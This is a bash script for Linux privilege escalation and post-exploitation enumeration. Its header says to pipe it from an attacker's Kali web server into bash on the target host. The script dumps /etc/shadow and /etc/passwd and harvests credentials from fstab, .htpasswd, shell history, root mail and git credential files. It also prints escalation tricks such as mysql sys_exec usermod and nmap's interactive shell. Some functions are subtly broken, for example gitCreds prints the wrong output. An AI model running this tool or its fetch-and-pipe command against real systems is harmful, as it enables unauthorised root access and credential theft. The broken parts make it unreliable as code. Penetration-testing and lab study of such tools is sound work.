#!/bin/bash
#This custom bash script was written by Mark Herbst
#Most Commands are from LinEnum.sh script https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh version 0.971
#Other references inlcude G0tmi1k's blog https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
#Usage:  chmod +x then ./privesc-linux.sh
#Usage:  on Kali python -m SimpleHTTPServer default port is 8000
#Usage:  on target wget or curl KaliIP:port/python/server/dir/privesc-linux.sh | bash
#privesc-linux.sh runs a series of local bash commands to enumerate a Linux target for the purpose of finding conditions
#that will allow local privilege escalation
#results are sent to the console to minimize alteration of the target environment

############
#System Info
############

#function kernelInfo
#get basic kernal info
function kernelInfo
{
	uname=`uname -a 2>/dev/null`
	echo -e "\e[92mKernel Information:\e[0m"
	echo -e "\e[92mCommand used:  uname -a\e[0m\n$uname"
}

#function versionInfo
#get kernal version info
function versionInfo
{
	version=`cat /proc/version 2>/dev/null`
	echo -e "\e[92mVersion Information:\e[0m"
	echo -e "\e[92mCommand used:  cat /proc/version\e[0m\n$version"
}

#function releaseInfo
#get release information
#searches all *-release files for version info
function releaseInfo
{
	release=`cat /etc/*-release 2>/dev/null`
	echo -e "\e[92mRelease Information:\e[0m"
	echo -e "\e[92mCommand used:  cat /etc/*-release\e[0m\n$release"
}

#function hostInfo
#get host information
function hostInfo
{
	host=`hostname 2>/dev/null`
	echo -e "\e[92mHost Information:\e[0m"
	echo -e "\e[92mCommand used:  hostname\e[0m\n$host"
}

################
#User/Group Info
################
#function userInfo
#get current user information
function userInfo
{
	user=`id`
	echo -e "\e[92mCurrent User Information:\e[0m"
	echo -e "\e[92mCommand used:  id\e[0m\n$user"
}

#function lastUsers
#get users logged on over past 30 days
function lastUsers
{
	last=`lastlog -t 30`
	echo -e "\e[92mPreviously Logged On Users in Last 30 Days:\e[0m"
	echo -e "\e[92mCommand used:  lastlog -t 30\e[0m\n$last"
}

#function currentUsers
#get users currently logged on
function currentUsers
{
	current=`w`
	echo -e "\e[92mCurrent Users:\e[0m"
	echo -e "\e[92mCommand used:  w\e[0m\n$current"
}

#function rootAccounts
#get all root accounts (uid 0)
function rootAccounts
{
	rootAccts=`grep -v -E "^#" /etc/passwd 2>/dev/null | awk -F: '$3 == 0 { print $1}' 2>/dev/null`
	echo -e "\e[92mAll Root Accounts:\e[0m"
	echo -e "\e[92mCommand used:  grep -v -E \"^#\" /etc/passwd 2>/dev/null | awk -F: '$3 == 0 { print $1}' 2>/dev/null\e[0m\n$rootAccts"
}

#####################
#Hashes and Passwords
#####################

#function storedHashes
#check if any hashes are stored in /etc/passwd
#condition is a deprecated unix password storage method
function storedHashes
{
	hashes=`grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null`
	echo -e "\e[92mPassword Hashes in /etc/passwd:\e[0m"
	echo -e "\e[92mCommand used:  grep -v '^[^:]*:[x]' /etc/passwd\e[0m\n$hashes"
}

#function getPasswd
#get /etc/passwd file
#BSD 'shadow' variant `cat /etc/master.passwd 2>/dev/null`
function getPasswd
{
	readPasswd=`cat /etc/passwd`
	echo -e "\e[92mContents of /etc/passwd:\e[0m"
	echo -e "\e[92mCommand used:  cat /etc/passwd\e[0m\n$readPasswd"
}

#function getShadow
#get /etc/shadow file
function getShadow
{
	readShadow=`cat /etc/shadow`
	echo -e "\e[92mContents of /etc/shadow:\e[0m"
	echo -e "\e[92mCommand used:  cat /etc/shadow\e[0m\n$readShadow"
}

#################
#User Permissions
#################

#function getSudoers
#get sudoers info
function getSudoers
{
	getSudoers=`grep -v -e '^$' /etc/sudoers 2>/dev/null | grep -v "#" 2>/dev/null`
	echo -e "\e[92mSudoers configuration:\e[0m"
	echo -e "\e[92mCommand used:  grep -v -e '^$' /etc/sudoers 2>/dev/null |grep -v \"#\" 2>/dev/null\e[0m\n$getSudoers"
}

#function sudoPerms
#can we sudo without supplying a password
function sudoPerms
{
	canSudo=`echo '' | sudo -S -l -k 2>/dev/null`
	echo -e "\e[92mUsers who can sudo without supplying a password!:\e[0m"
	echo -e "\e[92mCommand used:  echo '' | sudo -S -l -k 2>/dev/null\e[0m\n$canSudo"
}

#function pastSudoers
#accounts who have sudoed in the past
function pastSudoers
{
	pastSudos=`find /home -name .sudo_as_admin_successful 2>/dev/null`
	echo -e "\e[92mAccounts that have recently used sudo:\e[0m"
	echo -e "\e[92mCommand used:  find /home -name .sudo_as_admin_successful 2>/dev/null\e[0m\n$pastSudos"
}

######################
#Directory Permissions
######################

#function currentDir
#list the files in the current directory and permissions
function currentDir
{
	currentDirPerms=`ls -lah 2>/dev/null`
	echo -e "\e[92mList of Files in Current Directory and Permissions:\e[0m"
	echo -e "\e[92mCommand used:  ls -ahl /root/ 2>/dev/null\e[0m\n$currentDirPerms"
}	
	
#DO NOT RUN, FOR REFERENCE ONLY
#function rootHome
#get root home directory if accessible
function rootHome
{
	rootHomeDir=`ls -ahl /root/ 2>/dev/null`
	echo -e "\e[92mRoot Home Directory (if accessible):\e[0m"
	echo -e "\e[92mCommand used:  `ls -ahl /root/ 2>/dev/null`\e[0m"
	echo $rootHomeDir
}

#DO NOT RUN, FOR REFERENCE ONLY
#function homePerms
#get home directory permissions
#print and tab out:  filename, filepath, user, group, file perms, newline, print errors to console
function homeDir
{
	getHomeDir=`ls -ahl /home/ 2>/dev/null`
	echo -e "\e[92mHome Directory Permissions:\e[0m"
	echo -e "\e[92mCommand used:  `ls -ahl /home/ 2>/dev/null`\e[0m"
	echo $getHomeDir

}

#################
#File Permissions
#################

#DO NOT RUN, FOR REFERENCE ONLY
#function writableFiles
#show all writable files owned by root
#or writable but not owned by us:  `find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
function writableFiles
{
	listWritableFiles=`find / -writable -user root 2>/dev/null | grep -v proc | grep -v dev 2>/dev/null`
	echo -e "\e[92mList of writable files owned by root:\e[0m"
	echo -e "\e[92mCommand used: find / -writable -user root 2>/dev/null | grep -v proc | grep -v dev 2>/dev/null\e[0m"
	echo $listWritableFiles
}

#DO NOT RUN, FOR REFERENCE ONLY
#function hiddenFiles
#list all hidden files
function hiddenFiles
{
	findHiddenFiles=`find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
	echo -e "\e[92mList of all hidden files on system:\e[0m"
	echo -e "\e[92mCommand used: find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null\e[0m"
	echo $findHiddenFiles
}

#function writablePasswd
#displays write perms for /etc/passwd
#if writable, privesc possible
function writablePasswd
{
	passwdIsWritable=`ls -al /etc/passwd`
	echo -e "\e[92mCan you write to /etc/passwd? If so, add a user with root privs 0 to the file!\e[0m"
	echo -e "Privilege Escalation Technique To Try:"
	echo -e "https://hacknpentest.com/linux-privilege-escalation-via-writeable-etc-passwd-file/"
	echo -e "\e[92mCommand used: cat /etc/shells 2>/dev/null\e[0m\n$passwdIsWritable"
}

#function worldWritable
#find all world writable files other than /proc and /sys
function worldWritable
{
	worldWritableFiles=`find / ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f -exec ls -la {} 2>/dev/null \;`
	echo -e "\e[92mWorld Writable files (excluding /proc and /sys type files)\e[0m"
	echo -e "\e[92mCommand used: find / ! -path "*/proc/*" ! -path "/sys/*" -perm -2 -type f -exec ls -la {} 2>/dev/null \;\e[0m\n$worldWritableFiles"
}

#function posixCapabilities
#list all files with POSIX capabilities set along with there capabilities
function posixCapabilities
{
	listPOSIX=`getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null`
	echo -e "\e[92mFiles with POSIX capabilities set:\e[0m"
	echo -e "\e[92mCommand used:  getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null\e[0m\n$listPOSIX"
}

#######
#Shells
#######

#function availShells
#list shells available on system
function availShells
{
	listShells=`cat /etc/shells 2>/dev/null`
	echo -e "\e[92mList shells available on system:\e[0m"
	echo -e "Privilege Escalation Technique To Try:"
	echo -e "At bash prompt:  sudo -l"
	echo -e "\e[92mCommand used: cat /etc/shells 2>/dev/null\e[0m\n$listShells"
}

##########
#Cron Jobs
##########

#DO NOT RUN, FOR REFERENCE ONLY
#function cronJobs
#list cron jobs configured on system
function cronJobs
{
	listCrons=`ls -la /etc/cron* 2>/dev/null`
	echo -e "\e[92mList Cron Jobs configured on system:\e[0m"
	echo -e "\e[92mCommand used: ls -la /etc/cron* 2>/dev/null\e[0m\n$listCrons"
}

#function writableCrons
#list writable cron jobs
function writableCrons
{
	listWritableCrons=`find /etc/cron* -perm -0002 -type f -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
	echo -e "\e[92mList Writable Cron Jobs:\e[0m"
	echo -e "\e[92mCommand used: find /etc/cron* -perm -0002 -type f -exec ls -la {} \; -exec cat {} 2>/dev/null \;\e[0m\n$listWritableCrons"
}

#############
#Network Info
#############

#function nicInfo
#get network and IP info
function nicInfo
{
	getNICinfo=`/sbin/ifconfig -a 2>/dev/null`
	echo -e "\e[92mNetwork and IP Address Info:\e[0m"
	echo -e "\e[92mCommand used: /sbin/ifconfig -a 2>/dev/null\e[0m\n$getNICinfo"
}

#function arpInfo
#get arp info
function arpInfo
{
	getARPinfo=`arp -ae 2>/dev/null`
	echo -e "\e[92mARP Info:\e[0m"
	echo -e "\e[92mCommand used: arp -ae 2>/dev/null\e[0m\n$getARPinfo"
}

#function nameServer
#get nameserver info
function nameServer
{
	getNameserverInfo=`grep "nameserver" /etc/resolv.conf 2>/dev/null`
	echo -e "\e[92mNameserver Info:\e[0m"
	echo -e "\e[92mCommand used: grep \"nameserver\" /etc/resolv.conf 2>/dev/null\e[0m\n$getNameserverInfo"
}

#function routeInfo
#get route configuration
function routeInfo
{
	getRouteInfo=`route 2>/dev/null`
	echo -e "\e[92mNameserver Info:\e[0m"
	echo -e "\e[92mCommand used: route 2>/dev/null\e[0m\n$getRouteInfo"
}

#function listeningTCP
#lists all listening TCP services
function listeningTCP
{
	listeningTCPservices=`netstat -ntpl 2>/dev/null`
	echo -e "\e[92mListening TCP Services:\e[0m"
	echo -e "\e[92mCommand used: netstat -ntpl 2>/dev/null\e[0m\n$listeningTCPservices"
	
}

#function listeningUDP
#lists all listening UDP services
function listeningUDP
{
	listeningUDPservices=`netstat -nupl 2>/dev/null`
	echo -e "\e[92mListening UDP Services:\e[0m"
	echo -e "\e[92mCommand used: netstat -nupl 2>/dev/null\e[0m\n$listeningUDPservices"
}

#######################
#Processes and Services
#######################

#DO NOT RUN, FOR REFERENCE ONLY
#function procs
#lists all running processes
function procs
{
	psaux=`ps aux 2>/dev/null`
	echo -e "\e[92mRunning Processes:\e[0m"
	echo -e "\e[92mCommand used: ps aux 2>/dev/null\e[0m\n$psaux"
}

#####################
#Software Enumeration
#####################
#Displays Software Versions so versions can be checked for known vulnerabilities

#function sudoVersion
#displays sudo version
function sudoVersion
{
	getSudoVersion=`sudo -V 2>/dev/null| grep "Sudo version"`
	echo -e "\e[92mSudo Version (Check if vulnerable version):\e[0m"
	echo -e "\e[92mCommand used: sudo -V 2>/dev/null| grep \"Sudo version\"\e[0m\n$getSudoVersion"
}

#function mysqlVersion
#displays mysql version
function mysqlVersion
{
	mysqlVersion=`mysql --version 2>/dev/null`
	echo -e "\e[92mmysql Version (Check if vulnerable version):\e[0m"
	echo -e "Privilege Escalation Technique To Try"
	echo -e "Log into mysql as root with no password, run a usermod command with sys_exec to get root from ssh user john"
	echo -e "mysql -h localhost -u root -p select sys_exec('usermod -a -G admin john');"
	echo -e "sudo su"
	echo -e "whoami"
	echo -e "\e[92mCommand used: mysql --version 2>/dev/null\e[0m\n$mysqlVersion"
}

#function postgresVersion
#displays version of postgres
function postgresVersion
{
	psqlVersion=`psql -V 2>/dev/null`
	echo -e "\e[92mPostgres Version (Check if vulnerable version):\e[0m"
	echo -e "\e[92mCommand used: psql -V 2>/dev/null\e[0m\n$psqlVersion"
}

#function apacheVersion
#displays apache version
function apacheVersion
{
	getApacheVersion=`apache2 -v 2>/dev/null; httpd -v 2>/dev/null`
	echo -e "\e[92mApache Version (Check if vulnerable version):\e[0m"
	echo -e "\e[92mCommand used: apache2 -v 2>/dev/null; httpd -v 2>/dev/null\e[0m\n$getApacheVersion"
}

#function apachePasswd
#checks to see if .htpasswd file exists which can contain passwords
function apachePasswd
{
	htpasswd=`find / -name .htpasswd -print -exec cat {} \; 2>/dev/null`
	echo -e "\e[92mSearch for .htpasswd file.  IF htpasswd file found it could contain passwords!:\e[0m"
	echo -e "\e[92mCommand used: find / -name .htpasswd -print -exec cat {} \; 2>/dev/null\e[0m\n$htpasswd"
}

#function tools
#checks to see if certain useful tools are installed
function tools
{
	findTools=`which sudo 2>/dev/null ; which nc 2>/dev/null ; which netcat 2>/dev/null ; which wget 2>/dev/null ; which nmap 2>/dev/null ; which gcc 2>/dev/null; which curl 2>/dev/null`
	echo -e "\e[92mPotentially Useful Tools Installed:\e[0m"
	echo -e "Privilege Escalation Techniques To Try:"
	echo -e "At bash prompt:  sudo nmap --interactive then nmap> !sh"
	echo -e "At bash prompt:  sudo -l"
	echo -e "\e[92mCommand used: which sudo 2>/dev/null ; which nc 2>/dev/null ; which netcat 2>/dev/null ; which wget 2>/dev/null ; which nmap 2>/dev/null ; which gcc 2>/dev/null; which curl 2>/dev/null\e[0m\n$findTools"
}

###################
#Credentials Search
###################

#function userHistory
#extract any user history files that are accessible
function userHistory
{
	userHistoryFiles=`ls -la ~/.*_history 2>/dev/null`
	echo -e "\e[92mUser History Files:\e[0m"
	echo -e "\e[92mCommand used: ls -la ~/.*_history 2>/dev/null\e[0m\n$userHistoryFiles"
}

#function rootHistory
#extract root history files that are accessible
function rootHistory
{
	rootHistoryFiles=`ls -la /root/.*_history 2>/dev/null`
	echo -e "\e[92mRoot History Files (passwords could be stored here):\e[0m"
	echo -e "\e[92mCommand used: ls -la /root/.*_history 2>/dev/null\e[0m\n$rootHistoryFiles"
}

#function bashHistory
#extract bash history files
function bashHistory
{
	bashHistoryFiles=`find /home -name .bash_history -print -exec cat {} 2>/dev/null \;`
	echo -e "\e[92mBash History in /home directory:\e[0m"
	echo -e "\e[92mCommand used: find /home -name .bash_history -print -exec cat {} 2>/dev/null \;\e[0m\n$bashHistoryFiles"
}

#function readMail
#attempt to read Root's mail
function readMail
{
	readRootMail=`head /var/mail/root 2>/dev/null`
	echo -e "\e[92mAttempt to read Root Mail\e[0m"
	echo -e "\e[92mCommand used: head /var/mail/root 2>/dev/null\e[0m\n$readRootMail"
}

#function fstabCreds
#search for credentials in fstab
function fstabCreds
{
	fstabCredsSearch=`grep username /etc/fstab 2>/dev/null |awk '{sub(/.*\username=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo username: 2>/dev/null; grep password /etc/fstab 2>/dev/null |awk '{sub(/.*\password=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo password: 2>/dev/null; grep domain /etc/fstab 2>/dev/null |awk '{sub(/.*\domain=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo domain: 2>/dev/null`
	echo -e "\e[92mSearch for credentials in /etc/fstab\e[0m"
	echo -e "\e[92mCommand used: grep username /etc/fstab 2>/dev/null |awk '{sub(/.*\username=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo username: 2>/dev/null; grep password /etc/fstab 2>/dev/null |awk '{sub(/.*\password=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo password: 2>/dev/null; grep domain /etc/fstab 2>/dev/null |awk '{sub(/.*\domain=/,"");sub(/\,.*/,"")}1' 2>/dev/null| xargs -r echo domain: 2>/dev/null\e[0m\n$fstabCredsSearch"
}

#function fstabCredsFile
#search for an fstab Credentials File
function fstabCredsFile
{
	fstabCredsFileSearch=`grep cred /etc/fstab 2>/dev/null |awk '{sub(/.*\credentials=/,"");sub(/\,.*/,"")}1' 2>/dev/null | xargs -I{} sh -c 'ls -la {}; cat {}' 2>/dev/null`
	echo -e "\e[92mSearch for an fstab Credentials File in /etc/fstab\e[0m"
	echo -e "\e[92mCommand used:  grep cred /etc/fstab 2>/dev/null |awk '{sub(/.*\credentials=/,"");sub(/\,.*/,"")}1' 2>/dev/null | xargs -I{} sh -c 'ls -la {}; cat {}' 2>/dev/null\e[0m\n$fstabCredsFileSearch"
}

#function gitCreds
#search for git credential files
function gitCreds
{
	gitCredsSearch=`find / -name ".git-credentials" 2>/dev/null`
	echo -e "\e[92mAttempt to read Root Mail\e[0m"
	echo -e "\e[92mCommand used: head /var/mail/root 2>/dev/null\e[0m\n$readRootMail"
	
}

##############
#run functions
##############
echo -e "\e[92mLinux Enumeration and Privilege Escalation Script\e[0m\n"
#System Info
kernelInfo
	echo -e "\n"
versionInfo
	echo -e "\n"
releaseInfo
	echo -e "\n"
hostInfo
	echo -e "\n"
#User/Group Info
userInfo
	echo -e "\n"
lastUsers
	echo -e "\n"
currentUsers
	echo -e "\n"
rootAccounts
	echo -e "\n"
#Hashes and Passwords
storedHashes
	echo -e "\n"
getPasswd
	echo -e "\n"
getShadow
	echo -e "\n"
#User Permissions
getSudoers
	echo -e "\n"
sudoPerms
	echo -e "\n"
pastSudoers
	echo -e "\n"
#Directory Permissions SOME FUNCTIONS ARE NOT USED, RESULTS TOO LENGTHY
currentDir
	echo -e "\n"
#File Permissions
writablePasswd
	echo -e "\n"
worldWritable
	echo -e "\n"
posixCapabilities
	echo -e "\n"
#Shells
availShells
	echo -e "\n"
#Cron Jobs
writableCrons
	echo -e "\n"
#Network Info
nicInfo
	echo -e "\n"
arpInfo
	echo -e "\n"
nameServer
	echo -e "\n"
routeInfo
	echo -e "\n"
listeningTCP
	echo -e "\n"
listeningUDP
	echo -e "\n"
#Processes and Services FUNCTION NOT USED, RESULTS TOO LENGTHY ps aux
#Software
sudoVersion
	echo -e "\n"
mysqlVersion
	echo -e "\n"
postgresVersion
	echo -e "\n"
apacheVersion
	echo -e "\n"
apachePasswd
	echo -e "\n"
tools
	echo -e "\n"
#Credentials Search
userHistory
	echo -e "\n"
rootHistory
	echo -e "\n"
bashHistory
	echo -e "\n"
readMail
	echo -e "\n"
fstabCreds
	echo -e "\n"
fstabCredsFile
	echo -e "\n"

